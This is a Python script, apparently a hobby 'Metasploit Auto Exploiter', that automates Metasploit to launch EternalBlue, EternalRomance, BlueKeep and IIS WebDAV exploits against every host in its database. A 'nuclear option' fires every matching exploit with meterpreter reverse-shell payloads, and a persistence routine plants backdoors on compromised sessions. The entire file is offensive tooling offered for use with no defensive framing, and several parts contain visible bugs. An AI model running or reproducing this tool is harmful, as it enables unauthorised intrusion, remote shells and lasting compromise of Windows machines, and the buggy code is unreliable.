import socket
import time

import pandas as pd

import common.utils
import pymetasploit3.msfrpc
from pymetasploit3 import msfrpc
from pymetasploit3.msfconsole import MsfRpcConsole
from pymetasploit3.msfrpc import MsfRpcMethod

from common.utils import start_metasploit, printd, clear_terminal

SUCCESS_LIST = set()


def meterpreter_sid(client):
    s = client.sessions.list
    for sid in s:
        if s[sid]['type'] == 'meterpreter':
            assert int(sid)
            yield sid


def shell_sid(client):
    s = client.sessions.list
    for sid in s:
        if s[sid]['type'] == 'shell':
            assert int(sid)
            yield sid


def run_module_with_output(console, mod, payload=None, run_as_job=False, timeout=301, runoptions=None):
    """
    Execute a module and wait for the returned data

    Mandatory Arguments:
    - mod : the MsfModule object

    Optional Keyword Arguments:
    - payload : the MsfModule object to be used as payload
    """
    options_str = ['use {}/{}'.format(mod.moduletype, mod.modulename)]
    if console.is_busy():
        raise msfrpc.MsfError('Console {} is busy'.format(console.cid))
    console.read()  # clear data buffer
    opts = runoptions.copy()
    # if payload is None:
    #     opts['DisablePayloadHandler'] = True

    # Set module params
    for k in opts.keys():
        options_str.append('set {} {}'.format(k, opts[k]))

    options_str.append('run -z')
    if run_as_job:
        options_str[-1] += " -j"
    # options_str += "\n"
    for option in options_str:
        console.write(option)
        time.sleep(1)
    # console.write(options_str)
    data = ''
    timer = 0
    while data == '' or console.is_busy():
        time.sleep(1)
        data += console.read()['data']
        timer += 1
        if timer > timeout:
            break
    return data



def exploit_eternalblue(client):

    """
    Exploit eternalblue
    @https://en.wikipedia.org/wiki/EternalBlue
    EternalBlue is a security vulnerability in Microsoft Windows that was leaked by the Shadow Brokers in April 2017.
    It is a remote code execution vulnerability that affects all supported versions of Windows, including Windows 10.

    :param client: client object
    :return: client object
    """
    global SUCCESS_LIST
    clear_terminal()
    printd("EternalBlue", header=True)
    hosts = client.db.workspaces.workspace('default').hosts.list
    for host in hosts:
        try:
            exploit = "windows/smb/ms17_010_eternalblue"
            ex = client.modules.use('exploit', exploit)

            runoptions = {}
            if 'RHOSTS' in ex.missing_required:
                runoptions['RHOSTS'] = host['address']
                # print(runoptions['RHOSTS'])

            run_setup = pd.DataFrame.from_dict(runoptions, orient='index', columns=['value'], )
            run_setup.style.set_caption("Arguments to be passed to exploit")
            printd(run_setup)

            cid = client.consoles.list[0]['id']
            time.sleep(1)

            out = run_module_with_output(client.consoles.console(cid), ex, runoptions=runoptions)
            printd(out)  # print output
            max_time = 30
            printd(f"Waiting {max_time} seconds for session to be created")
            while len(client.sessions.list) == SUCCESS_LIST:
                client.consoles.console(cid).write("sessions -l")
                printd(client.consoles.console(cid).read())
                time.sleep(1)
                max_time -= 1
                if max_time == 0:
                    raise TimeoutError("Session not created")
            if len(client.sessions.list) > len(SUCCESS_LIST):
                print("Session created")
                client.consoles.console(cid)
                SUCCESS_LIST.add(exploit)
        except Exception as e:
            print(e)
            print(type(e))
            continue



def exploit_microsoft_iis(client):
    """
    Exploit microsoft iis
    :param client: client object
    :return: client object
    """
    global SUCCESS_LIST
    clear_terminal()
    printd("Microsoft IIS", header=True)
    hosts = client.db.workspaces.workspace('default').hosts.list
    exploit = "windows/iis/iis_webdav_upload_asp"
    ex = client.modules.use('exploit', exploit)

    for host in hosts:
        try:
            runoptions = {
                'RHOSTS': host['address'],
            }
                # print(runoptions['RHOSTS'])

            run_setup = pd.DataFrame.from_dict(runoptions, orient='index', columns=['value'], )
            run_setup.style.set_caption("Arguments to be passed to exploit")
            printd(run_setup)

            cid = client.consoles.list[0]['id']
            time.sleep(1)

            out = run_module_with_output(client.consoles.console(cid), ex, runoptions=runoptions)
            printd(out)
            max_time = 30
            printd(f"Waiting {max_time} seconds for session to be created")
            while len(client.sessions.list) == SUCCESS_LIST:
                client.consoles.console(cid).write("sessions -l")
                printd(client.consoles.console(cid).read())
                time.sleep(1)
                max_time -= 1
                if max_time == 0:
                    raise TimeoutError("Session not created")

        except Exception as e:
            print(e)
            print(type(e))
            continue
        if len(client.sessions.list) > len(SUCCESS_LIST):
            print("Session created")
            client.consoles.console(cid)
            SUCCESS_LIST.add(exploit)




def nuclear_option(client):
    """
    Get exploits for vulnerable host
    execute exploit
    THIS IS A WORK IN PROGRESS
    It doesnt really work and will probably never work
    it definitely will break the target machine
    :param client:
    :param hosts: list of hosts
    :return: list of exploits
    """
    global SUCCESS_LIST
    # host = "192.168.86.63"
    # port = "445"

    # ex = client.modules.execute(ex)
    # ex['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
    # print(ex['LHOST'])
    # ex['LHOST'] = '192.168.86.64'
    # ex['LPORT'] = 4444

    # cid = client.consoles.console().cid

    clear_terminal()

    services = client.db.workspaces.workspace('default').services.list
    hosts = client.db.workspaces.workspace('default').hosts.list
    printd(f"Exploiting hosts {', '.join([host['address'] for host in hosts])}", header=True)
    for service in services:
        printd(f"Exploiting {service['name']}", header=True)
        port = service['port']
        # get the host object where host['address'] == service['host']
        host = next((host for host in hosts if host['address'] == service['host']), None)
        # print(host)
        platform = host['os_name']
        service_name = service['name']
        # if port == 445:

        # else:
        query = f'port:{port} platform:windows type:exploit arch:x64'
        printd("Looking for exploits that satisfies: \n\t" + query)
        exploits = client.modules.search(query)
        # print(exploits)
        for exploit_dict in exploits:
            fullname = exploit_dict['fullname'].split("/")
            ex_type = fullname[0]
            exploit = "/".join(fullname[1:])
            try:

                ex = client.modules.use(ex_type, exploit)
                if "windows/x64/meterpreter/reverse_tcp" not in ex.targetpayloads():
                    continue
                elif 'RPORT' in ex.options and port != ex['RPORT']:
                    print("RPORT is not the same as the port of the service")
                    continue
                clear_terminal()
                printd(f"Trying exploit {exploit} on {host['address']}:{port}", header=True)
                # print(ex.options)
                # print(ex.missing_required)
                # print(ex.required)
                runoptions = {}
                if 'RHOSTS' in ex.missing_required:
                    runoptions['RHOSTS'] = host['address']

                if 'RPORT' in ex.missing_required:
                    runoptions['RPORT'] = port
                # if 'LHOST' in ex.options:
                runoptions['LHOST'] = '0.0.0.0'
                # if 'LPORT' in ex.options:
                runoptions['LPORT'] = "4444"
                if 'SRVHOST' in ex.missing_required:
                    runoptions['SRVHOST'] = '0.0.0.0'
                if 'SRVPORT' in ex.missing_required:
                    runoptions['SRVPORT'] = "8080"
                if 'ForceExploit' in ex.missing_required:
                    print(runoptions['ForceExploit'])
                if 'AllowNoCleanup' in ex.missing_required:
                    runoptions['AllowNoCleanup'] = 'true'
                if len(ex.targets) > 1 and 'automatic' not in str(list(ex.targets.values())[0]).lower() or "auto" not in str(list(ex.targets.values())[0]).lower():
                    if host['os_name'] in list(ex.targets.values()):
                        runoptions['TAR3GET'] = list(ex.targets.keys())[list(ex.targets.values()).index(host['os_name'])]
                    else:

                        for key, target in ex.targets.items():
                            if host['os_name'] in target or 'windows 7' in target.lower():
                                runoptions['TARGET'] = key
                                break
                            elif key == ex.targets.keys()[-1]:
                                printd("No suitable target found for exploit")
                                print(ex.targets)
                                runoptions['TARGET'] = int(input("Enter target #: "))


                # runoptions['CheckModule'] = ex.check()
                runoptions['WORKSPACE'] = 'default'

                runoptions['VERBOSE'] = 'true'
                print("MISSING")
                for o in ex.missing_required:
                    print(o)
                # get console id
                cid = client.consoles.list()[0]['id']
                # if 'windows' in ex.targets[ex.target].lower():
                if 'windows/x64/meterpreter/reverse_tcp_allports' in ex.targetpayloads():
                    runoptions['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp_allports'
                else:
                    runoptions['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
                # runoptions['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp_allports'
                # for o in ex.missing_required:
                #     if o not in runoptions.keys():
                #         try:
                #             runoptions[o] = ex.runoptions[o]
                #         except KeyError:
                #             pass
                # put runoptions into dataframe
                temp_target = runoptions['TARGET']
                runoptions['TARGET'] = ex.targets[runoptions['TARGET']]
                run_setup = pd.DataFrame.from_dict(runoptions, orient='index', columns=['value'], )
                run_setup['TARGET'] = temp_target
                del temp_target
                printd(run_setup)
                out = run_module_with_output(client.consoles.console(cid), ex, runoptions=runoptions)
                # print(out)  # print output

                print(out)
                print(client.consoles.console(cid).read())

            except Exception as e:
                print(e)
                print(type(e))
                continue
            if len(client.sessions.list) > len(SUCCESS_LIST):
                print("Session created")
                SUCCESS_LIST.add(exploit)


def are_you_sure(client):
    clear_terminal()
    try:
        printd("Are you sure you want to run this script? This will run all exploits on all hosts in the database. (y/n)", header=True)
        if input().lower() == 'y':
            raise NotImplementedError("Well Damn... Honestly I didn't think you would actually run this script.")
        else:
            printd("Exiting... i guess :(", header=True)

            return
    except NotImplementedError as e:
        printd(f"Error: {type(e)} - {e}", header=True, delay=1)
        time.sleep(2)
        for i in range(5, 0, -1):
            printd(f"Exiting in {i} seconds...", header=True)
            time.sleep(min(max(1-common.utils.DELAY, 0), 1))
        clear_terminal()
        printd("Kidding of course, here you go", delay=1)
        common.utils.wasteland = True
        time.sleep(5)
        nuclear_option(client)



def exploit_eternalchampion(client):
    """
    eternal romance by another name
    :param client:
    :return:
    """

    exploit_eternalromance(client)





def run_exploits(client, *args):
    """
    run a number of exploit methods
    I would expect some of these to be fail tbh
    They dont tend to play nice
    mostly cos theyre... well... exploits
    (and also the same one)
    :param client:
    :param args:
    :return:
    """
    consoles = client.consoles.list
    cid = consoles[0]['id']
    for func in args:
        print(f"Running {func}")
        try:
            func(client)
            client.consoles.console(cid).write('back')
            persist(client, str(client.sessions.list[-1]['id']))
        except Exception as e:
            print(e)
            print(type(e))
            continue


def exploit_eternalromance(client, verbose=False):
    """
    Exploits Eternal Romance
    :param client: Metasploit client
    :return: None
    """
    if not verbose:
        clear_terminal()
    printd("Exploiting Eternal Romance", header=True)
    # get hosts
    hosts = client.db.workspaces.workspace('default').hosts.list
    # get ports
    port = 445
    exploit = "exploit/windows/smb/ms17_010_psexec"
    # get exploit
    fullname = exploit.split("/")
    ex_type = fullname[0]
    exploit = "/".join(fullname[1:])
    ex = client.modules.use('exploit', exploit)
    for host in hosts:
        printd(f"Trying exploit {exploit} on {host['address']}:{port}", header=True)
        try:
            arguments = {
                'RHOSTS': host['address'],
            }
            # get console id
            cid = client.consoles.list[0]['id']
            # put runoptions into dataframe
            run_setup = pd.DataFrame.from_dict(arguments, orient='index', columns=['value'], )
            printd(run_setup)
            out = run_module_with_output(client.consoles.console(cid), ex, runoptions=arguments)
            if verbose:
                printd(out)  # print output
                printd(client.consoles.console(cid).read())
            max_time = 30
            printd(f"Waiting {max_time} seconds for session to be created")
            while len(client.sessions.list) == SUCCESS_LIST:
                client.consoles.console(cid).write("sessions -l")
                if verbose:
                    printd(client.consoles.console(cid).read())
                time.sleep(1)
                max_time -= 1
                if max_time == 0:
                    raise TimeoutError("Session not created")
        except Exception as e:
            printd(e)
            printd(type(e))
            continue
        if len(client.sessions.list) > len(SUCCESS_LIST):
            printd("Session created")
            client.consoles.console(cid).sessiondetach()
            SUCCESS_LIST.add(exploit)
    # ports = client.db.services.search(workspace='default')
    # get exploits
    # exploits = client.modules.search(query='exploit/windows/smb/eternalromance')
    # print(exploits)
def exploit_bluekeep(client):
    """
    @https://en.wikipedia.org/wiki/BlueKeep
    BlueKeep is a security vulnerability that was discovered in Microsoft's Remote Desktop Protocol implementation,
    which allows for the possibility of remote code execution.
    :param client:
    :return:
    """
    clear_terminal()
    printd("Exploiting BlueKeep", header=True)
    # get hosts
    hosts = client.db.workspaces.workspace('default').hosts.list
    # get ports
    port = 3389
    exploit = "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
    # get exploit
    fullname = exploit.split("/")
    ex_type = fullname[0]
    exploit = "/".join(fullname[1:])
    ex = client.modules.use('exploit', exploit)
    for host in hosts:
        printd(f"Trying exploit {exploit} on {host['address']}:{port}", header=True)
        try:
            arguments = {
                'RHOSTS': host['address'],
                'TARGET': 2
            }
            # get console id
            cid = client.consoles.list[0]['id']
            # put runoptions into dataframe
            run_setup = pd.DataFrame.from_dict(arguments, orient='index', columns=['value'], )
            printd(run_setup)
            out = run_module_with_output(client.consoles.console(cid), ex, runoptions=arguments)
            printd(out)  # print output
            printd(client.consoles.console(cid).read())
            max_time = 30
            printd(f"Waiting {max_time} seconds for session to be created")
            while len(client.sessions.list) == SUCCESS_LIST:
                client.consoles.console(cid).write("sessions -l")
                printd(client.consoles.console(cid).read())
                time.sleep(1)
                max_time -= 1
                if max_time == 0:
                    raise TimeoutError("Session not created")
        except Exception as e:
            printd(e)
            printd(type(e))
            continue
        if len(client.sessions.list) > len(SUCCESS_LIST):
            printd("Session created")
            SUCCESS_LIST.add(exploit)
    # ports = client.db.services.search(workspace='default')
    # get exploits
    # exploits = client.modules.search(query='exploit/windows/smb/eternalromance')
    # print(exploits)

def persist(client, sid):
    """
    Persist a session
    :param client:
    :param sid:
    :return:
    """
    clear_terminal()
    printd(f"Persisting session {sid}", header=True)
    # get hosts
    hosts = client.db.workspaces.workspace('default').hosts.list
    # get ports
    port = 4444
    ip = '192.168.86.64'
    exploit = "/windows/local/persistence"
    # get exploit
    fullname = exploit.split("/")
    ex_type = fullname[0]
    exploit = "/".join(fullname[1:])
    ex = client.modules.use('exploit', exploit)
    cid = client.consoles.list[0]['id']
    arguments = {
        'SESSION': sid,
        'PATH': f'{client.sessions.session(sid).get_writeable_dir()}',
    }
    # put runoptions into dataframe
    run_setup = pd.DataFrame.from_dict(arguments, orient='index', columns=['value'], )
    printd(run_setup)
    out = run_module_with_output(client.consoles.console(cid), ex, runoptions=arguments)
    printd(out)  # print output
    printd(client.consoles.console(cid).read())


    # ports = client.db.services.search(workspace='default')
    # get exploits
    # exploits = client.modules.search(query='exploit/windows/smb/eternalromance')
    # print(exploits)


def test_exploit(client):
    """
    Just to prove error handling
    :param client:
    :return:
    """
    clear_terminal()
    printd("Exploiting BlueKeep", header=True)
    # get hosts
    hosts = client.db.workspaces.workspace('default').hosts.list
    # get ports
    port = 3389
    exploit = "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
    # get exploit
    fullname = exploit.split("/")
    ex_type = fullname[0]
    exploit = "/".join(fullname[1:])
    ex = client.modules.use('exploit', exploit)
    for host in hosts:
        printd(f"Trying exploit {exploit} on {host['address']}:{port}", header=True)
        try:
            arguments = {

            }
            # get console id
            cid = client.consoles.list[0]['id']
            # put runoptions into dataframe
            run_setup = pd.DataFrame.from_dict(arguments, orient='index', columns=['value'], )
            printd(run_setup)
            out = run_module_with_output(client.consoles.console(cid), ex, runoptions=arguments)
            printd(out)  # print output
            printd(client.consoles.console(cid).read())
            max_time = 30
            printd(f"Waiting {max_time} seconds for session to be created")
            while len(client.sessions.list) == SUCCESS_LIST:
                client.consoles.console(cid).write("sessions -l")
                printd(client.consoles.console(cid).read())
                time.sleep(1)
                max_time -= 1
                if max_time == 0:
                    raise TimeoutError("Session not created")
        except Exception as e:
            printd(e)
            printd(type(e))
            continue
        if len(client.sessions.list) > len(SUCCESS_LIST):
            printd("Session created")
            SUCCESS_LIST.add(exploit)


def main(client, verbose=False):
    finished = False

    while not finished:
        if not verbose:
            clear_terminal()
        printd("Welcome to the Metasploit Auto Exploiter", header=True)

        try:
            # print(client.modules.exploits)
            # INDIVIDUAL EXPLOITS
            printd("1. Individual Exploits")
            # BATCH EXPLOITS
            printd("2. Batch Exploits")
            # TEST EXPLOITS
            printd("3. Test Exploits")
            # EXIT
            printd("4. Exit")

            choice = input("Enter your choice: ")
            if choice == "1":
                printd("1. Eternal Romance")
                printd("2. BlueKeep")
                printd("3. Eternal Blue")
                printd("4. Microsoft IIS")
                printd("5. Eternal Champion")
                printd("6. Exit")
                choice = input("Enter your choice: ")
                if choice == "1":
                    run_exploits(client, exploit_eternalromance)
                elif choice == "2":
                    run_exploits(client, exploit_bluekeep)
                elif choice == "3":
                    run_exploits(client, exploit_eternalblue)
                elif choice == "4":
                    run_exploits(client, exploit_microsoft_iis)
                elif choice == "5":
                    run_exploits(client, exploit_eternalchampion)
                elif choice == "6":
                    finished = True
                else:
                    printd("Invalid choice")
            elif choice == "2":
                printd("1. ALL ETERNALS")
                printd("2. ALL MISC")
                printd("3 ALL TEST")
                printd("4. NUCLEAR OPTION")
                printd("5. Exit")
                choice = input("Enter your choice: ")
                if choice == "1":
                    run_exploits(client, *(exploit_eternalblue, exploit_eternalchampion, exploit_eternalromance,))
                elif choice == "2":
                    run_exploits(client, *(exploit_bluekeep, exploit_microsoft_iis,))
                elif choice == "3":
                    run_exploits(client, *(exploit_eternalblue, exploit_eternalchampion, exploit_eternalromance,
                                          exploit_bluekeep, exploit_microsoft_iis,))
                elif choice == "4":
                    run_exploits(client, nuclear_option)
                elif choice == "5":
                    finished = True
                else:
                    printd("Invalid choice")

            elif choice == "3":
                printd("1. Broken Script")
                printd("2. All Test Scripts")
                printd("3. Nuclear Test")
                printd("4. Exit")
                choice = input("Enter your choice: ")
                if choice == "1":
                    run_exploits(client, test_exploit)
                elif choice == "2":
                    run_exploits(client, *(exploit_eternalblue, exploit_eternalchampion, exploit_eternalromance,
                                           exploit_bluekeep, exploit_microsoft_iis,))
                elif choice == "3":
                    run_exploits(client, nuclear_option)
                elif choice == "4":
                    finished = True
                else:
                    printd("Invalid choice")




            # choice = int(input("Choose Wisely: "))
            # if choice == 1:
            #     exploit_eternalblue(client)
            # elif choice == 2:
            #     exploit_eternalchampion(client)
            # elif choice == 3:
            #     exploit_eternalromance(client, verbose=verbose)
            # elif choice == 4:
            #     exploit_bluekeep(client)
            # elif choice == 5:
            #     run_exploits(client, *(exploit_eternalblue, exploit_eternalchampion, exploit_eternalromance, exploit_bluekeep))
            # elif choice == 6:
            #     if not common.utils.wasteland:
            #         are_you_sure(client)
            #     else:
            #         nuclear_option(client)

            elif choice == 4:
                finished = True
            else:
                printd("Invalid Choice")
            # print vulnerability information
            # exploit_eternalblue(client)
            # exploit_hosts(client)



        except Exception as e:
            return f"Error ({type(e)}): {e}"
        else:
            # gracefully disconnect from db
            succesful_exploits = SUCCESS_LIST.copy()
            SUCCESS_LIST.clear()
            return f"Created {len(client.sessions.list)} sessions. The following exploits were successful: " + ", ".join(
                succesful_exploits)
        # gracefully disconnect from msfrpcd
        # client.logout()
        # return to main
